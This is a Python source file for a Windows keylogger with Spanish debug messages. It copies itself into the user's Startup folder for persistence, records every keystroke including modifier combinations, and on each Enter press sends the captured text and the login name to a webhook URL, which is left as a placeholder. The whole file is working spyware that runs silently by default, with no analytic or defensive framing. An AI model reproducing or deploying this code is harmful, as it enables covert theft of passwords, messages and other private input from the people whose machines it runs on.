import time
import threading
import requests
import keyboard
import os
import winshell
import sys
import shutil

WEBHOOK_URL = "Your webhook URL here"
DEBUG = False

class PersistentKeyLogger:
    
    def __init__(self, debug: bool = True):
        self.debug = debug
        self.add_to_startup()

    def add_to_startup(self):
        if winshell is None:
            if self.debug:
                print("[DEBUG] winshell no disponible; no se puede añadir al inicio.")
            return False

        if getattr(sys, 'frozen', False):
            current_file = sys.executable
        else:
            current_file = os.path.abspath(__file__)

        try:
            startup_folder = winshell.startup()
            destination = os.path.join(startup_folder, os.path.basename(current_file))
            if os.path.exists(destination):
                if self.debug:
                    print(f"[DEBUG] Ya existe en Startup: {destination}")
                return True
            shutil.copy(current_file, destination)
            if self.debug:
                print(f"[DEBUG] Copiado a Startup: {destination}")
            return True
        except Exception as e:
            if self.debug:
                print(f"[DEBUG] Error al copiar a Startup: {e}")
            return False

class KeyLogger:

    def __init__(self, debug: bool = False, webhook: str = ''):
        self.debug = debug
        self.webhook = webhook
        self.lock = threading.Lock()
        self.keys_chain = []
        self.username = os.getlogin()

    def listen_keys(self):
        if self.debug:
            print('\n[  LISTENING KEYS   ]\n')

        def on_press(event):
            key = event.name
            mods = []

            if keyboard.is_pressed('ctrl'):
                mods.append(" [Ctrl")

            if keyboard.is_pressed('alt'):
                mods.append(" [Alt")

            if keyboard.is_pressed('shift'):
                mods.append(" [Shift")

            if mods:
                combo = ' + '.join(mods) + ' + ' + key + '] '
                self.keys_chain.append(combo)
            else:
                self.keys_chain.append(key)

            if self.debug:
                print(f'[DEBUG] Key pressed: {key}')

            # Check if Enter key is pressed
            if key == 'enter':
                self.send_data()

        keyboard.on_press(on_press)

        try:
            while True:
                time.sleep(1)

        except Exception as e:
            if self.debug:
                print(f'[!] Error in listen_keys: {e} [!]')

    def send_data(self):
        if not self.keys_chain:
            return

        try:
            with self.lock:
                formatted_keys = []
                for key in self.keys_chain:
                    if key == 'space':
                        formatted_keys.append(' ')
                    elif key in ['tab', 'enter', 'backspace', 'esc', 'delete', 'insert', 'home', 'end', 'page up', 'page down', 'bloq mayus']:
                        formatted_keys.append(f' [{key.upper()}] ')
                    else:
                        formatted_keys.append(key)

                keys_string = ''.join(formatted_keys)
                data = {'content': f"\n{self.username} -> {keys_string}"}
                response = requests.post(self.webhook, data=data, timeout=20)

                if self.debug:
                    if response.status_code in (200, 201, 204):
                        print(f'[+] Data sent successfully. Status code {response.status_code} [+]')
                    else:
                        print(f'[!] Failed to send data: {response.status_code} [!]')

                self.keys_chain.clear()

        except requests.RequestException as response:
            if self.debug:
                print(f'[!] Network error while sending: {response} [!]')

        except Exception as error:
            if self.debug:
                print(f'[!] Error sending data: {error} [!]')

    def run(self):
        listen_keys_thread = threading.Thread(target=self.listen_keys)
        listen_keys_thread.daemon = True
        listen_keys_thread.start()

        try:
            while True:
                time.sleep(1)

        except KeyboardInterrupt:
            print("[+] Exiting gracefully [+]")
            listen_keys_thread.join()

def main():
    while True:
        try:
            PersistentKeyLogger()
            KeyLogger(webhook=WEBHOOK_URL, debug=DEBUG).run()
        except Exception as e:
            if DEBUG:
                print(f'[!] Error in main loop: {e} [!]')
            time.sleep(5)

main()